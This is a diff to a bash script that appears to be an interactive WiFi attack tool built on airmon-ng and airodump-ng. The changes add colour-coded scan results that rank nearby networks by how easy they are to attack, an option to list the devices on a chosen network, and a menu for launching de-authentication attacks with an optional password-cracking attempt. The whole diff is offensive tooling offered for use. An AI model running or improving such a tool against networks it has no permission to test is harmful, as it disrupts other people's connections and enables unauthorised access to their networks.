@@ -6,6 +6,7 @@ filePath=
 # color
 green=`tput setaf 2`
 red=`tput setaf 1`
+yellow=`tput setaf 11`
 reset=`tput sgr0`
 
 # check root permissions
@@ -75,12 +76,11 @@ fi
 start () {
 	echo ""
 	echo "-- SELECT AN OPERATION --"
-	echo "[1] De-auth attack (automatic)"
-	echo "[2] De-auth attack (manual)"
-	echo "[3] Show clients connected to network"
-	echo "[4] Disable monitor mode for $interfaceMon"
+	echo "[1] Start network scan"
+	echo "[2] Manuel de-auth attack"
+	echo "[3] Disable monitor mode for $interfaceMon"
 	echo ""
-	read -p 'Select operation [1-4]: ' option2
+	read -p 'Select operation [1-3]: ' option2
 	echo ""
 
 	if [ "$option2" == "1" ] # auto attack
@@ -105,6 +105,11 @@ start () {
 		sed -i '1d' scan-01.csv
 		echo ""
 		echo "-- SCAN RESULT --"
+		echo ""
+		echo "${green}GREEN: OPEN NETWORK${reset}"
+		echo "${yellow}YELLOW: WEAK SECURITY (WPA, WPA2, WEP, OPN)${reset}"
+		echo "${red}RED: STRONG SECURITY, NOT POSSIBLE TO DE-AUTH (WPA3)${reset}"
+		echo ""
 		i=1
 		filename=scan-01.csv
 		while read line; do
@@ -119,13 +124,26 @@ start () {
 			name=${line: -22}
 			name=$(echo $name | grep -o '[^\,.]\{4,\}')
 			name=$(echo $name | xargs)
+			# encryption method
 			security=$(echo $line | grep -o 'WPA2\|WPA3\|OPN\|WEP')
+			security=${security//$'\n'/}
 			if [ "$name" == "" ]; then 
 					# Network name is unknown
-					name="${red}Unknown name${reset}"
+					name="Hidden network"
 			fi
-			# print
-			echo "[$i] $name [$security] (MAC: $mac)"
+			if [ "$security" = "" ]; then
+				# no security
+				echo "${green}[$i] $name ["Open"] ($mac) - channel: $channel${reset}"
+			elif [ "$security" == "WPA" ] || [ "$security" == "WPA2" ] || [ "$security" == "WEP" ] || [ "$security" == "OPN" ]; then
+				# weak security
+				echo "${yellow}[$i] $name [$security] ($mac) - channel: $channel${reset}"
+			else
+				# WPA3
+				if [ "$security" == "WPA3WPA2" ]; then
+					security=WPA3
+				fi
+				echo "${red}[$i] $name [$security] ($mac) - channel: $channel${reset}"
+			fi	
 			i=$((i+1))
 		done < $filename
 		# Choose network
@@ -138,18 +156,29 @@ start () {
 		name=${res: -22}
 		name=$(echo $name | grep -o '[^\,.]\{4,\}')
 		security=$(echo $res | grep -o 'WPA2\|WPA3\|OPN\|WEP')
+		security=${security//$'\n'/}
 		echo ""
-		echo "-- Selected --"
-		echo "Name: $name"
-		echo "Encryption: $security"
-		echo "Mac: $ap"
-		echo "Channel: $channel"
+		echo "$name [$security] ($ap) - channel: $channel"
 		echo ""
-		read -p "De-auth requests (default is 1): " number
+		echo "-- SELECT OPERATION --"
+		echo "[1] See devices connected to network"
+		echo "[2] Perform de-auth attack on network"
+		echo "[3] Quit"
 		echo ""
-		read -p "Try to crack WiFi password (y/n)? " capture
+		read -p "Select operation [1-3]: " choose
 		echo ""
-		deAuth
+
+		if [ "$choose" == "1" ]; then
+			sudo airodump-ng $interfaceMon --bssid $ap --channel $channel -a
+		elif [ "$choose" == "2" ]; then
+			read -p "De-auth requests (default is 1): " number
+			echo ""
+			read -p "Try to crack WiFi password (y/n)? " capture
+			echo ""
+			deAuth
+		else
+			exit
+		fi
 	elif [ "$option2" == "2" ] # manual attack
 		then
 		echo ""
@@ -211,12 +240,8 @@ start () {
 		fi
 
 		deAuth
-	fi
-	elif [ "$option2" == "3" ] # show clients
-		then
-		read -p 'Enter network name (SSID): ' name
-		sudo airodump-ng $interfaceMon --essid $name -a 		
-	elif [ "$option2" == "4" ]
+	fi	
+	elif [ "$option2" == "3" ]
 		then
 		echo "Stoppping interface..."
 		sudo airmon-ng stop $interfaceMon > /dev/null
